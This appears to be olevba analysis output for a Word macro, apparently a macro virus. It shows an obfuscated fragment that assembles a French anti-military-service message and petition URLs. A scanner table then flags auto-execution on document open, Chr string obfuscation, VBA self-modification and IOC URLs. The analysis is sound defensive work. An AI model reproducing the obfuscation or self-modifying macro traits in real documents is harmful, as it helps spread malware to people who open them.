c1 = c1 + "effectuer" + Chr(32) + "notre" + _
Chr(32) + "service" + Chr(32) + "militaire." + Chr(32) + "250" _
+ Chr(32) _
+ "000" + Chr(32) + "étudiants," + Chr(32) + "salariés," + Chr(32) + "rêveurs," + Chr(32) ' iifjxvhpyvjiaz
c1 = c1 + "entrepreneurs," + _
Chr(32) + "chômeurs," + Chr(32) + "voyageurs" ' lkumnvsebq
b2 = Chr(32) + "ou" + Chr(32) + "tout" + Chr(32) + "simplement" + Chr(32) + "amoureux" + Chr(32) + "qui" + Chr(32) + "ont" + Chr(32) + "d" + Chr(39) + "autres" + Chr(32) + "projets" + Chr(32) + "de" + Chr(32) + "Vie" + Chr(32) ' dfnlvx
b2 = b2 + "pour" + Chr(32) + "ces" + Chr(32) + "10" + Chr(32) + "mois." + Chr(32) + "Ils" + Chr(32) + "refusent" + Chr(32) + "d" + Chr(39) + "effectuer" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "inégalitaire" + Chr(32): b2 = _
b2 + "et" + Chr(32) + "dépassé," + Chr(32) + "bref" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "qui" + Chr(32) + "ne" + Chr(32) + "sert" + Chr(32) + "plus" + Chr(32) + "rien.": b1 = "Mobilisons-nous" + Chr(32) + "!" + Chr(13) + Chr(13) + "Pétition" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) + "sursitaires" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail:" ' tmvkicz
b1 = b1 + Chr(32) + "http://sn.agat.net" + Chr(13) + "La" + Chr(32) + "révolte" + Chr(32) + "du" + Chr(32) + _
"service" + Chr(32) + "militaire:" + Chr(32) + "http://altern.org/gigm/service.htm" + Chr(13): a1 = "La" + Chr(32) + "pétition" + Chr(32) + "du" + Chr(32) + "magazine" + Chr(32) + "Don" + Chr(32) + "Quichotte:" + Chr(32) + "http://www.donquichotte.com" + Chr(13) + _
"Non" + Chr(32) + "au" + Chr(32) + "S.N." ' wwwhoegm
a1 _
= a1 + Chr(32) + "qui" + Chr(32) + "tue" + _
Chr(32) + "l" + Chr(39) + "emploi:" + Chr(32) + "http://www.multimania.com/antisn": e4 = _
Chr(80) + _
Chr(114) + Chr(105) + Chr(118) + Chr(97) + _
Chr(116) + Chr(101): j17 = Chr(69) + Chr(110) + Chr(100) ' pzhkrbjnjvpiv
c7 = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98) ' cnwpxth
End Sub ' ozafjiz

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://sn.agat.net  |URL                                          |
|IOC       |http://altern.org/gi|URL                                          |
|          |gm/service.htm      |                                             |
|IOC       |http://www.donquicho|URL                                          |
|          |tte.com             |                                             |
|IOC       |http://www.multimani|URL                                          |
|          |a.com/antisn        |                                             |
+----------+--------------------+---------------------------------------------+

